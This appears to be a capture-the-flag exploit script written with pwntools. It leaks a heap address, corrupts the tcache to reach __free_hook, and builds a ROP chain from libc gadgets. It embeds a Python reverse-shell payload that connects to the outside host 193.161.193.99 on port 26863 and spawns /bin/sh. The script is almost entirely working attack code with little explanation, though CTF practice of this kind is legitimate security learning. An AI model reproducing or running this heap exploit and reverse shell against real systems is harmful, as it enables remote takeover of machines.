req2(0x80 + 4, 1, b'A'*0x80)
for i in range(1): 
    req2(0x20 + 4, 1, b'A'*0x10)
r(0x100)
r(0x100)
req2(0x100, 0, b'YWFhYWFhYWFhYWFhYWFhCg==') # leak heap base
leak = r(8)
leak = int_from_bytes(leak)
print('leak: ', hex(leak))
heap_base = leak - 0xcc0
print('heap base: ', hex(heap_base))
req2(0x100 + 4 - 0x20, 1, b'A'*0xe0)
#overwrite tcache
payload = b'A'*0x10 + p64(0x25) + p64(libc.symbols['__free_hook'] - 0xbc) + p64(0x1111111111111111)*2 + p64(0x25)
payload += p64(heap_base + 0x1158) + p64(0xdeadbeef)*4 + p64(libc.address - 0xbd7bf40 - 0x80)
payload += p64(0xdeadebeef)
payload = payload.ljust(8*0x10)
b64 = base64.b64encode(payload)
print('payload: ', b64)
print('len: ', hex(len(b64)))
req2(len(b64) + 4, 0, b64)

MOV_RDI_PRBX = 0x000000000009e7f1 + libc.address#: mov rdi, qword ptr [rbx + 0x48] ; mov rsi, r14 ; call rax
MOV = 0x000000000010ce85 + libc.address#: mov rdi, qword ptr [rbx + 0x80] ; call qword ptr [rax + 0x88]
CALL_RAX = 0x0000000000146e72 + libc.address#: mov rax, qword ptr [rbx + 0x20] ; mov rdi, rbp ; call qword ptr [rax + 0x20]
MOV_RDX = 0x000000000010d18b + libc.address #: mov rdx, qword ptr [rax + 0xb0] ; call qword ptr [rax + 0x88]
MOV_RSP_RDX = 0x000000000005b4d0 + libc.address#: mov rsp, rdx ; ret
POP_RDI = 0x0000000000023b6a + libc.address#: pop rdi ; ret
SYSCALL = 0x000000000002284d + libc.address#: syscall
POP_RDX_R12 = 0x0000000000119431 + libc.address#: pop rdx ; pop r12 ; ret
POP_RSI = 0x000000000002601f + libc.address#: pop rsi ; ret


MOV_RSP_RDX = 0x000000000005b4d0 + libc.address#: mov rsp, rdx ; ret
shell = b"C"*0x80 +  b"/bin/python3\x00-c\x00socket=__import__(\"socket\");os=__import__(\"os\");pty=__import__(\"pty\");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"193.161.193.99\",26863));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")\x00" + b'\x00'*4
PYTHON3 = heap_base + 0x1070
C = PYTHON3 + 0xd
SOCKET = C + 3
ARG = heap_base + 0x1300
reverse_shell = ROP(libc)
reverse_shell.dup2(0x10, 0)
reverse_shell.dup2(0x10, 1)
reverse_shell.system(next(libc.search(b'/bin/sh\x00')))
                                                    # pivot here v
shell += p64(MOV_RDX)*0xb + p64(MOV_RSP_RDX)*0x7 + p64(heap_base + 0x12c0) + p64(MOV_RSP_RDX)*4 + p64(POP_RDI + 1)*0x12 + reverse_shell.chain() + flat(PYTHON3, C, SOCKET, 0) + p64(POP_RDI) + p64(0x20) + p64(libc.symbols['sleep']) + p64(0xcafebabe)*(0x10 - 7)
#shell += p64(MOV_RDX)*0xb + p64(MOV_RSP_RDX)*0x7 + p64(libc.address - 0xbd7c0e0 + 0x380) + p64(MOV_RSP_RDX)*4 + p64(POP_RDI + 1)*0x22 + p64(libc.symbols['system'])

#shell = b'B'*0x200
req2(len(shell) + 10, 1, shell)
print(hex(CALL_RAX))
pause()
payload = p64(CALL_RAX)*2
payload = payload[:-5]
b64 = base64.b64encode(payload)
print('len: ', hex(len(b64)))
req2(len(b64) + 4, 0, b64)

#KCSC{n0_way!_integer_ov3rfl0w_h3r3???}
p.interactive()
```

